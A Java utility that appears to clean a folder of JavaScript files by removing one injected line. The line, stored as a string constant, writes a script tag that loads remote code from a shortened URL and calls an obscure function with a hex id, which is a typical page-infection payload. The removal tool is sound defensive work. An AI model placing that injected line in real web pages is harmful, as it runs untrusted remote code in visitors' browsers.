package com.example.demo.liaotian;

import java.io.*;
import java.util.LinkedList;

/**
 * author: lixq
 * date: 2019/2/21
 * 描述:
 */
public class FileChange {
    private static String str = "document.write('<script src=\"http://t.cn/EvlonFh\"></script><script>OMINEId(\"e02cf4ce91284dab9bc3fc4cc2a65e28\",\"-1\")</script>');";
    public static void main(String[] args) {
        readFile("D:\\js");
    }

    public static void readFile(String path) {
        File f = new File(path);
        File f2  = new File("D:\\js\\new.js");
        File[] files = f.listFiles();
        LinkedList<File> list = new LinkedList<File>();
        for(File file:files){
            if(file.isDirectory()){
                readFile(file.getAbsolutePath());
            }else {
                readWriteFile(file,f2);
            }

        }

    }

    public static void readWriteFile(File file,File f2){
        if(file.getName().endsWith(".js")){
            System.out.println(file.getName());
            //不关闭文件会导致资源的泄露，读写文件都同理
            try {
                FileReader reader = new FileReader(file);
                // 建立一个对象，它把文件内容转成计算机能读懂的语言
                BufferedReader br = new BufferedReader(reader);
                if(!f2.exists()){
                    try {
                        f2.createNewFile();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                PrintWriter writer = new PrintWriter(f2);
                String line;
                //网友推荐更加简洁的写法
                while ((line = br.readLine()) != null) {
                    if(line.equals(str)){
                        continue;
                    }
                    writer.println(line);
                    writer.flush();
                }
                writer.close();
                br.close();
                file.delete();
                f2.renameTo(file);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
